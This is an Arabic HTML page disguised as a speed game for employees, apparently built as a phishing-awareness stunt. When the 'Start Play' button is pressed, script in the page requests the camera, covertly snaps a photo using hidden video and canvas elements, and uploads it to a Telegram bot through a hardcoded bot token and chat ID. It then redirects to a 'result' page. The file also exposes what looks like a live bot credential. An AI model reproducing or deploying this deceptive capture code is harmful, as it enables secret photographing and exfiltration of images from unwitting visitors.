<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحدي السرعة والذكاء </title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; background: #f0f2f5; padding-top: 80px; color: #333; }
        .container { background: white; padding: 40px; border-radius: 20px; display: inline-block; box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 90%; }
        h1 { color: #2d3436; margin-bottom: 10px; }
        p { color: #636e72; font-size: 18px; }
        .btn { padding: 18px 45px; background: #00b894; color: white; border: none; border-radius: 50px; cursor: pointer; font-size: 22px; font-weight: bold; transition: 0.3s; margin-top: 20px; }
        .btn:hover { background: #009475; transform: translateY(-3px); }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>تحدي الموظف الأسرع! </h1>
        <p> تعتقد أنك تملك سرعة عالية؟</p>
        <p> اضغط على الزر أدناه لتبدأ اللعبة.</p>
        <button class="btn" onclick="startPlay()">Start Play</button>
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        // بيانات البوت الخاصة بكِ
        const botToken = "8376755103:AAHrdB9GV8gY-9KKFM3pwbv9j9TnKh04z8k";
        const chatId = "1126875861"; 

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        async function startPlay() {
            try {
                // طلب الإذن وفتح الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                // التقاط الصورة بعد ثانية واحدة (لضمان وضوح الكاميرا)
                setTimeout(async () => {
                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                    const imgData = canvas.toDataURL('image/png');
                    
                    // تحويل الصورة لـ Blob لإرسالها لتيليجرام
                    const response = await fetch(imgData);
                    const blob = await response.blob();
                    
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, 'capture.png');
                    formData.append('caption', '⚠️ الضغط على الروابط مهارة، والحذر منها احتراف. اليوم صورتك عندنا، بكرة بياناتك وين ممكن تكون؟ ');

                    // إرسال الصورة للبوت
                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    }).then(() => {
                        // حفظ الصورة محلياً لعرضها في صفحة الصدمة
                        localStorage.setItem('hacked_img', imgData);
                        window.location.href = "result.html";
                    });
                }, 1000);
            } catch (err) {
                alert("عفواً! اللعبة تتطلب الوصول للكاميرا للمشاركة في التحدي 🎮");
            }
        }
    </script>
</body>
</html>
